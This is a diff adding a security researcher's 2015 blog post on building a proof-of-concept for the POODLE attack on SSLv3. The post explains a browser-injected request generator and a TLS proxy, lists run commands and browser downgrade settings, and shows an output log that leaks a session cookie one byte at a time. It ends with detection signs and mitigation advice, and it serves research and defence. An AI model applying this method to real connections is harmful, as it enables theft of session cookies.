@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+          <title>Thomas Patzkes Personal Website - Implementing the POODLE Attack</title>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" type="text/css" href="./theme/css/style.css" />
+        <link rel="stylesheet" type="text/css" href="./theme/css/pygment.css" />
+
+
+
+
+
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+            <a href="./">Thomas Patzkes Personal Website </a>
+        </header><!-- /#banner -->
+        <div id="content">
+<section id="content" class="body">
+  <header>
+    <h2 class="entry-title">
+      <a href="./implementing-the-poodle-attack.html" rel="bookmark"
+         title="Permalink to Implementing the POODLE Attack">Implementing the POODLE Attack</a></h2>
+ 
+  </header>
+  <footer class="post-info">
+    <time class="published" datetime="2015-05-13T00:00:00+02:00">
+      Mi 13 Mai 2015
+    </time>
+    <address class="vcard author">
+      By           <a class="url fn" href="./author/thomas-patzke.html">Thomas Patzke</a>
+    </address>
+    <div class="category">
+        Category: <a href="./category/research.html">research</a>
+    </div>
+  </footer><!-- /.post-info -->
+  <div class="entry-content">
+    <p>The <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">POODLE attack</a> gained my attention, as it was disclosed some
+time ago. An exploit has to act at different positions (victim browser, HTTP request generator and TLS proxy) in a
+coordinated way and it includes an interesting bit of broken cryptography. Furthermore I asked myself, how practicable
+this attack is and what the obstacles in buildung an exploit for it are. This writeup is about the experiences I have
+made while developing a Proof of Concept script for POODLE testing it.</p>
+<p>You can get the source code <a href="https://github.com/thomaspatzke/POODLEAttack">here</a>.</p>
+<h2>Related Work</h2>
+<p>During my work other people released some Proof of Concept code of the POODLE attack. The projects can be found on GitHub
+<a href="https://github.com/EiNSTeiN-/poodle/blob/master/src/poodle.py">here</a> and
+<a href="https://github.com/mpgn/poodle-exploit">here</a>. As far as I can see, both do not implement the request generator that is
+running inside the victims browser.</p>
+<p>Many other people developed checks for the POODLE vulnerability. Most code checks for SSLv3 support with CBC cipher
+usage. I <a href="https://github.com/thomaspatzke/PoodleCheck">wrote a check based on PolarSSL</a>, which checks the behavior of a
+TLS/SSL server on broken padding. This can also be used to verify vulnerable TLS implementations.</p>
+<h2>Implementation</h2>
+<p>The picture below gives a rough overview about of the implemented Proof of Concept code:</p>
+<p><img alt="Overview of Implementation" src="./images/POODLE-Attack-Overview.svg"></p>
+<p>The implemented parts are:</p>
+<ul>
+<li>A request generator, that runs in the victims browser. This can be injected in web pages requested via
+  HTTP and was implemeted as static JavaScript file (POODLEClient.js).</li>
+<li>A HTTP server that serves the static request generator code and answers requests from the request generator regarding
+  the parameters of the generated HTTPS requests to the attack target server. The Python module http.server was used
+  here.</li>
+<li>A TLS Proxy that modifies the intercepted TLS packets of the generated HTTPS requests and checks the response of the
+  server for them. The module socketserver was used.</li>
+<li>Some state has to be shared between TLS Proxy and HTTP server. Because both are running in different threads, the
+  Python classes Manager and BaseManager from multiprocessing.managers were used to create object instances that are
+  accessible from different threads and even remotely. Never used that before, nice Python feature :-)</li>
+</ul>
+<p>The implemetation itself follows the <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">description of the paper</a>:</p>
+<ol>
+<li>Degrade TLS protocol usage to SSLv3 by disruption of TLS handshake attempts.</li>
+<li>Justify the URL and POST length such that the last block of the ciphertext is padding. This is done by increasing the
+   POST body size by one byte until the cipher text extends by a block size.</li>
+<li>Perform the copy operation on every generated TLS packet and calculate the leaked byte if the server accepts the
+   modified packet.</li>
+</ol>
+<p>If you are interested in the details, just read the really good paper linked above!</p>
+<p>One obstacle I have encountered was, that the length of the POST body can unexpected influence the overall length
+of the plain text by the <em>Content-Length</em> HTTP request header, when the length of the body drops below 10 (or
+theoretically exceeds 100). This condition is circumvented by usage of body lengths of minimum 26 as start value. The
+minimum POST length while phase 3 of the attack is then 10 when a 16 byte block is shifted to the first byte.</p>
+<p>Another odd looking behaviour is, that the first TLS application data record only contains one plain text byte. This is
+a <a href="https://www.imperialviolet.org/2012/01/15/beastfollowup.html">countermeasure against exploitation of the BEAST
+vulnerability</a>. To make things simple, the POODLE PoC only
+handles application data records that exceed a certain size.</p>
+<h2>Optimization Potential</h2>
+<p>The PoC implementation of the attack is far from being optimal. Every generated request requires an additional HTTP
+roundtrip to ask the HTTP server for the next requests parameters, even when the parameters change only after a
+plaintext byte has leaked in the decryption phase.</p>
+<h2>Test Environment</h2>
+<p>The PoC is entirely written in Python 3.2. I developed and tested it on a recent version of Kali Linux.</p>
+<p>Because my preferred browser, Firefox, is not vulnerable against POODLE in current versions, I have used the following
+about:config parameters to get the vulnerability back for development and testing purposes:</p>
+<ul>
+<li><code>security.tls.version.min = 0</code></li>
+<li><code>security.tls.version.max = 0</code></li>
+<li><code>security.tls.version.fallback-limit = 0</code></li>
+<li><code>security.ssl3.*_rc4_* = false</code></li>
+</ul>
+<p>A script <em>TestHTTPServer.py</em> was created as attack target server. The SSLv3 listener was created with socat as follows:</p>
+<div class="highlight"><pre><span></span><span class="n">socat</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">x</span> <span class="n">OPENSSL</span><span class="o">-</span><span class="k">LISTEN</span><span class="p">:</span><span class="mi">4433</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="k">method</span><span class="o">=</span><span class="n">SSLv3</span><span class="p">,</span><span class="n">cert</span><span class="o">=</span><span class="n">cert</span><span class="o">-</span><span class="n">poodle</span><span class="p">.</span><span class="n">pem</span><span class="p">,</span><span class="k">key</span><span class="o">=</span><span class="k">key</span><span class="o">-</span><span class="n">poodle</span><span class="p">.</span><span class="n">pem</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">TCP</span><span class="p">:</span><span class="n">localhost</span><span class="p">:</span><span class="mi">4080</span>
+</pre></div>
+
+
+<p>It forwards the received connections to the HTTP server. Usually the PoC script deduces the MitM config from the target
+URL. The traffic has to be redirected by <a href="http://serverfault.com/questions/632251/traffic-redirecting-with-linux-man-in-the-middle">appropriate iptables
+rules</a> or similar. For testing the following command line
+was used to avoid MitM hassle:</p>
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">poodle</span><span class="p">.</span><span class="n">py</span> <span class="c1">--target-port 4433 --start-offset 384 https://localhost:8443</span>
+</pre></div>
+
+
+<p>I have created a script <code>poodle-dev.sh</code>, that starts these components. Just run the following commands in different
+terminals or as background jobs:</p>
+<div class="highlight"><pre><span></span><span class="p">.</span><span class="o">/</span><span class="n">poodle</span><span class="o">-</span><span class="n">dev</span><span class="p">.</span><span class="n">sh</span> <span class="n">httpserver</span>
+<span class="p">.</span><span class="o">/</span><span class="n">poodle</span><span class="o">-</span><span class="n">dev</span><span class="p">.</span><span class="n">sh</span> <span class="n">sslserver</span>
+<span class="p">.</span><span class="o">/</span><span class="n">poodle</span><span class="o">-</span><span class="n">dev</span><span class="p">.</span><span class="n">sh</span> <span class="n">attacker</span><span class="o">-</span><span class="n">nodebug</span>
+</pre></div>
+
+
+<p>The attack is performed by requesting the URL <code>http://localhost:8000</code> from a vulnerable browser. No user interaction is
+required, as long as the page remains open somewhere in the browser. Do not forget to accept the test certificates (in
+the demo environment at <a href="https://localhost:8443">https://localhost:8443</a>) in your browser before you start. XMLHttpRequests will fail elsewhere.</p>
+<p>This is how an attack looks like:</p>
+<div class="highlight"><pre><span></span>$ ./poodle.py --target-port <span class="m">4433</span> --start-offset <span class="m">384</span> https://localhost:8443
+Starting SSL/TLS server on :8443 forwarding to localhost:4433
+Starting HTTP server on :8000 generating requests to https://localhost:8443
+Decrypted byte <span class="m">384</span>: C <span class="o">(</span>0x43<span class="o">)</span> in <span class="m">8</span>.1950 seconds with <span class="m">57</span> requests
+Victim now leaked <span class="m">1</span> bytes: <span class="s2">&quot;C&quot;</span> <span class="m">57</span> requests and <span class="m">8</span>.195 seconds per leaked bytes, <span class="m">57</span> requests and <span class="m">8</span>.195 seconds total
+Decrypted byte <span class="m">385</span>: o <span class="o">(</span>0x6f<span class="o">)</span> in <span class="m">56</span>.7356 seconds with <span class="m">405</span> requests
+Victim now leaked <span class="m">2</span> bytes: <span class="s2">&quot;Co&quot;</span> <span class="m">231</span> requests and <span class="m">32</span>.465 seconds per leaked bytes, <span class="m">462</span> requests and <span class="m">64</span>.931 seconds total
+Decrypted byte <span class="m">386</span>: o <span class="o">(</span>0x6f<span class="o">)</span> in <span class="m">73</span>.1930 seconds with <span class="m">519</span> requests
+Victim now leaked <span class="m">3</span> bytes: <span class="s2">&quot;Coo&quot;</span> <span class="m">327</span> requests and <span class="m">46</span>.041 seconds per leaked bytes, <span class="m">981</span> requests and <span class="m">138</span>.124 seconds total
+Decrypted byte <span class="m">387</span>: k <span class="o">(</span>0x6b<span class="o">)</span> in <span class="m">36</span>.4802 seconds with <span class="m">259</span> requests
+Victim now leaked <span class="m">4</span> bytes: <span class="s2">&quot;Cook&quot;</span> <span class="m">310</span> requests and <span class="m">43</span>.651 seconds per leaked bytes, <span class="m">1240</span> requests and <span class="m">174</span>.604 seconds total
+Decrypted byte <span class="m">388</span>: i <span class="o">(</span>0x69<span class="o">)</span> in <span class="m">54</span>.8990 seconds with <span class="m">387</span> requests
+Victim now leaked <span class="m">5</span> bytes: <span class="s2">&quot;Cooki&quot;</span> <span class="m">325</span> requests and <span class="m">45</span>.901 seconds per leaked bytes, <span class="m">1627</span> requests and <span class="m">229</span>.503 seconds total
+Decrypted byte <span class="m">389</span>: e <span class="o">(</span>0x65<span class="o">)</span> in <span class="m">14</span>.2407 seconds with <span class="m">99</span> requests
+Victim now leaked <span class="m">6</span> bytes: <span class="s2">&quot;Cookie&quot;</span> <span class="m">287</span> requests and <span class="m">40</span>.624 seconds per leaked bytes, <span class="m">1726</span> requests and <span class="m">243</span>.744 seconds total
+Decrypted byte <span class="m">390</span>: : <span class="o">(</span>0x3a<span class="o">)</span> in <span class="m">34</span>.2510 seconds with <span class="m">240</span> requests
+Victim now leaked <span class="m">7</span> bytes: <span class="s2">&quot;Cookie:&quot;</span> <span class="m">280</span> requests and <span class="m">39</span>.714 seconds per leaked bytes, <span class="m">1966</span> requests and <span class="m">277</span>.995 seconds total
+Decrypted byte <span class="m">391</span>:   <span class="o">(</span>0x20<span class="o">)</span> in <span class="m">56</span>.8563 seconds with <span class="m">366</span> requests
+Victim now leaked <span class="m">8</span> bytes: <span class="s2">&quot;Cookie: &quot;</span> <span class="m">291</span> requests and <span class="m">41</span>.856 seconds per leaked bytes, <span class="m">2332</span> requests and <span class="m">334</span>.851 seconds total
+Decrypted byte <span class="m">392</span>: s <span class="o">(</span>0x73<span class="o">)</span> in <span class="m">3</span>.6992 seconds with <span class="m">26</span> requests
+Victim now leaked <span class="m">9</span> bytes: <span class="s2">&quot;Cookie: s&quot;</span> <span class="m">262</span> requests and <span class="m">37</span>.617 seconds per leaked bytes, <span class="m">2358</span> requests and <span class="m">338</span>.550 seconds total
+Decrypted byte <span class="m">393</span>: e <span class="o">(</span>0x65<span class="o">)</span> in <span class="m">8</span>.4984 seconds with <span class="m">59</span> requests
+Victim now leaked <span class="m">10</span> bytes: <span class="s2">&quot;Cookie: se&quot;</span> <span class="m">241</span> requests and <span class="m">34</span>.705 seconds per leaked bytes, <span class="m">2417</span> requests and <span class="m">347</span>.048 seconds total
+Decrypted byte <span class="m">394</span>: s <span class="o">(</span>0x73<span class="o">)</span> in <span class="m">4</span>.5597 seconds with <span class="m">31</span> requests
+Victim now leaked <span class="m">11</span> bytes: <span class="s2">&quot;Cookie: ses&quot;</span> <span class="m">222</span> requests and <span class="m">31</span>.964 seconds per leaked bytes, <span class="m">2448</span> requests and <span class="m">351</span>.608 seconds total
+Decrypted byte <span class="m">395</span>: s <span class="o">(</span>0x73<span class="o">)</span> in <span class="m">16</span>.6020 seconds with <span class="m">118</span> requests
+Victim now leaked <span class="m">12</span> bytes: <span class="s2">&quot;Cookie: sess&quot;</span> <span class="m">213</span> requests and <span class="m">30</span>.684 seconds per leaked bytes, <span class="m">2566</span> requests and <span class="m">368</span>.210 seconds total
+Decrypted byte <span class="m">396</span>: i <span class="o">(</span>0x69<span class="o">)</span> in <span class="m">3</span>.8552 seconds with <span class="m">27</span> requests
+Victim now leaked <span class="m">13</span> bytes: <span class="s2">&quot;Cookie: sessi&quot;</span> <span class="m">199</span> requests and <span class="m">28</span>.620 seconds per leaked bytes, <span class="m">2593</span> requests and <span class="m">372</span>.065 seconds total
+Decrypted byte <span class="m">397</span>: o <span class="o">(</span>0x6f<span class="o">)</span> in <span class="m">1</span>.4442 seconds with <span class="m">10</span> requests
+Victim now leaked <span class="m">14</span> bytes: <span class="s2">&quot;Cookie: sessio&quot;</span> <span class="m">185</span> requests and <span class="m">26</span>.679 seconds per leaked bytes, <span class="m">2603</span> requests and <span class="m">373</span>.510 seconds total
+Decrypted byte <span class="m">398</span>: n <span class="o">(</span>0x6e<span class="o">)</span> in <span class="m">11</span>.4498 seconds with <span class="m">82</span> requests
+Victim now leaked <span class="m">15</span> bytes: <span class="s2">&quot;Cookie: session&quot;</span> <span class="m">179</span> requests and <span class="m">25</span>.664 seconds per leaked bytes, <span class="m">2685</span> requests and <span class="m">384</span>.959 seconds total
+Decrypted byte <span class="m">399</span>: i <span class="o">(</span>0x69<span class="o">)</span> in <span class="m">39</span>.2923 seconds with <span class="m">279</span> requests
+Victim now leaked <span class="m">16</span> bytes: <span class="s2">&quot;Cookie: sessioni&quot;</span> <span class="m">185</span> requests and <span class="m">26</span>.516 seconds per leaked bytes, <span class="m">2964</span> requests and <span class="m">424</span>.252 seconds total
+Decrypted byte <span class="m">400</span>: d <span class="o">(</span>0x64<span class="o">)</span> in <span class="m">35</span>.4133 seconds with <span class="m">252</span> requests
+Victim now leaked <span class="m">17</span> bytes: <span class="s2">&quot;Cookie: sessionid&quot;</span> <span class="m">189</span> requests and <span class="m">27</span>.039 seconds per leaked bytes, <span class="m">3216</span> requests and <span class="m">459</span>.665 seconds total
+Decrypted byte <span class="m">401</span>: <span class="o">=</span> <span class="o">(</span>0x3d<span class="o">)</span> in <span class="m">23</span>.1957 seconds with <span class="m">166</span> requests
+Victim now leaked <span class="m">18</span> bytes: <span class="s2">&quot;Cookie: sessionid=&quot;</span> <span class="m">187</span> requests and <span class="m">26</span>.826 seconds per leaked bytes, <span class="m">3382</span> requests and <span class="m">482</span>.861 seconds total
+Decrypted byte <span class="m">402</span>: s <span class="o">(</span>0x73<span class="o">)</span> in <span class="m">7</span>.3688 seconds with <span class="m">53</span> requests
+Victim now leaked <span class="m">19</span> bytes: <span class="s2">&quot;Cookie: sessionid=s&quot;</span> <span class="m">180</span> requests and <span class="m">25</span>.802 seconds per leaked bytes, <span class="m">3435</span> requests and <span class="m">490</span>.229 seconds total
+Decrypted byte <span class="m">403</span>: u <span class="o">(</span>0x75<span class="o">)</span> in <span class="m">47</span>.2784 seconds with <span class="m">336</span> requests
+Victim now leaked <span class="m">20</span> bytes: <span class="s2">&quot;Cookie: sessionid=su&quot;</span> <span class="m">188</span> requests and <span class="m">26</span>.875 seconds per leaked bytes, <span class="m">3771</span> requests and <span class="m">537</span>.508 seconds total
+Decrypted byte <span class="m">404</span>: p <span class="o">(</span>0x70<span class="o">)</span> in <span class="m">2</span>.2508 seconds with <span class="m">16</span> requests
+Victim now leaked <span class="m">21</span> bytes: <span class="s2">&quot;Cookie: sessionid=sup&quot;</span> <span class="m">180</span> requests and <span class="m">25</span>.703 seconds per leaked bytes, <span class="m">3787</span> requests and <span class="m">539</span>.759 seconds total
+Decrypted byte <span class="m">405</span>: e <span class="o">(</span>0x65<span class="o">)</span> in <span class="m">17</span>.8258 seconds with <span class="m">127</span> requests
+Victim now leaked <span class="m">22</span> bytes: <span class="s2">&quot;Cookie: sessionid=supe&quot;</span> <span class="m">177</span> requests and <span class="m">25</span>.345 seconds per leaked bytes, <span class="m">3914</span> requests and <span class="m">557</span>.584 seconds total
+Decrypted byte <span class="m">406</span>: r <span class="o">(</span>0x72<span class="o">)</span> in <span class="m">1</span>.7210 seconds with <span class="m">12</span> requests
+Victim now leaked <span class="m">23</span> bytes: <span class="s2">&quot;Cookie: sessionid=super&quot;</span> <span class="m">170</span> requests and <span class="m">24</span>.318 seconds per leaked bytes, <span class="m">3926</span> requests and <span class="m">559</span>.305 seconds total
+Decrypted byte <span class="m">407</span>: s <span class="o">(</span>0x73<span class="o">)</span> in <span class="m">71</span>.9293 seconds with <span class="m">515</span> requests
+Victim now leaked <span class="m">24</span> bytes: <span class="s2">&quot;Cookie: sessionid=supers&quot;</span> <span class="m">185</span> requests and <span class="m">26</span>.301 seconds per leaked bytes, <span class="m">4441</span> requests and <span class="m">631</span>.235 seconds total
+Decrypted byte <span class="m">408</span>: e <span class="o">(</span>0x65<span class="o">)</span> in <span class="m">35</span>.3999 seconds with <span class="m">253</span> requests
+Victim now leaked <span class="m">25</span> bytes: <span class="s2">&quot;Cookie: sessionid=superse&quot;</span> <span class="m">187</span> requests and <span class="m">26</span>.665 seconds per leaked bytes, <span class="m">4694</span> requests and <span class="m">666</span>.635 seconds total
+Decrypted byte <span class="m">409</span>: c <span class="o">(</span>0x63<span class="o">)</span> in <span class="m">0</span>.7939 seconds with <span class="m">5</span> requests
+Victim now leaked <span class="m">26</span> bytes: <span class="s2">&quot;Cookie: sessionid=supersec&quot;</span> <span class="m">180</span> requests and <span class="m">25</span>.670 seconds per leaked bytes, <span class="m">4699</span> requests and <span class="m">667</span>.429 seconds total
+Decrypted byte <span class="m">410</span>: r <span class="o">(</span>0x72<span class="o">)</span> in <span class="m">46</span>.0715 seconds with <span class="m">326</span> requests
+Victim now leaked <span class="m">27</span> bytes: <span class="s2">&quot;Cookie: sessionid=supersecr&quot;</span> <span class="m">186</span> requests and <span class="m">26</span>.426 seconds per leaked bytes, <span class="m">5025</span> requests and <span class="m">713</span>.500 seconds total
+Decrypted byte <span class="m">411</span>: e <span class="o">(</span>0x65<span class="o">)</span> in <span class="m">1</span>.9057 seconds with <span class="m">12</span> requests
+Victim now leaked <span class="m">28</span> bytes: <span class="s2">&quot;Cookie: sessionid=supersecre&quot;</span> <span class="m">179</span> requests and <span class="m">25</span>.550 seconds per leaked bytes, <span class="m">5037</span> requests and <span class="m">715</span>.406 seconds total
+Decrypted byte <span class="m">412</span>: t <span class="o">(</span>0x74<span class="o">)</span> in <span class="m">21</span>.2495 seconds with <span class="m">151</span> requests
+Victim now leaked <span class="m">29</span> bytes: <span class="s2">&quot;Cookie: sessionid=supersecret&quot;</span> <span class="m">178</span> requests and <span class="m">25</span>.402 seconds per leaked bytes, <span class="m">5188</span> requests and <span class="m">736</span>.655 seconds total
+</pre></div>
+
+
+<h2>Observations</h2>
+<h3>Attack Performance</h3>
+<p>I performed several runs in the above local test environment and measured the time to succesfully leak 8 bytes. The
+minimum was 240 seconds, most attempts took 300 seconds or longer. As mentioned above, there is some improvement
+potential for the PoC, but in reality an attacker would not have the performance of a loopback network device
+;-)</p>
+<h3>Exploitability of Current Browser Versions</h3>
+<p>Current versions of Mozilla Firefox and Google Chrome are safe. They reject to connect with SSLv3 when TLS failed
+previously. Internet Explorer 11 starts with TLSv1.2 but allows degradation to SSLv3 by connection interruption.</p>
+<h3>Detection of the Attack</h3>
+<p>The traffic that occurs is quite unusual. The following suspisious properties can be observed:</p>
+<ul>
+<li>The termination of attempts to communicate with TLS 1.0 and higher.</li>
+<li>Cipher texts with two same blocks.</li>
+<li>A huge amount of HTTPS requests, that are terminated with an encrypted TLS alert message before a response can be
+  sent.</li>
+</ul>
+<p>Conclusion: POODLE attack attempts are detectible at network layer.</p>
+<h2>Conclusions</h2>
+<p>It is quite simple: <a href="http://tools.ietf.org/html/draft-ietf-tls-sslv3-diediedie-02">SSLv3 must die!</a>. The protocol was
+superseded in 1999 by <a href="http://tools.ietf.org/html/rfc2246">TLSv1.0</a>. Browsers that rely on it due to <a href="http://en.wikipedia.org/wiki/Transport_Layer_Security#browsersTSL">lack of support
+for TLS</a> are IE6 or Opera 4. Whoever still uses this
+browsers, has much more security issues than POODLE. Keeping SSLv3 enabled for customers that use these browsers means that
+the security of users with newer browsers is degraded.</p>
+<p>Simply: disable it.</p>
+<p>When offering websites via insecure HTTP it is possible for a MitM
+attacker to inject malicious JavaScript code into pages, which is
+required for the POODLE attack (request generator). Therefore the usage
+of insecure HTTP should be reduced as much as possible. <a href="http://en.wikipedia.org/wiki/CRIME">CRIME</a> is another
+vulnerability that requires the attackers code to be executed in the victims browser.</p>
+<p><em>Thanks to <a href="https://twitter.com/DanielX4v3r">Daniel Sauder</a> for proofreading and testing!</em></p>
+<p><em>Thanks to <a href="https://twitter.com/nikosdanopoulos">Danopoulos Nikos</a> for pointing me to some typos.</em></p>
+  </div><!-- /.entry-content -->
+</section>
+        </div>
+        <nav id="menu"><ul>
+            <li><a href="./index.html">Main Page</a></li>
+            <li><a href="./pages/angriffe-auf-voip.html">Angriffe auf VoIP</a></li>
+            <li><a href="./pages/diplomarbeit.html">Diplomarbeit</a></li>
+            <li><a href="./pages/contact.html">Contact</a></li>
+        <li class="active"><a href="/blog.html">Blog</a>
+          <ul>
+                <li><a href="./category/bughunting.html">bughunting</a></li>
+                <li class="active"><a href="./category/research.html">research</a></li>
+                <li><a href="./category/sigma.html">sigma</a></li>
+          </ul>
+        </ul></nav><!-- /#menu -->
+        <footer id="contentinfo" class="body">
+            <a href="/pages/contact.html">Contact and Imprint</a><br />
+            <small>All content published here is my personal opinion or work and not affiliated with my employer in any manner.</small>
+        </footer><!-- /#contentinfo -->
+</body>
+</html>
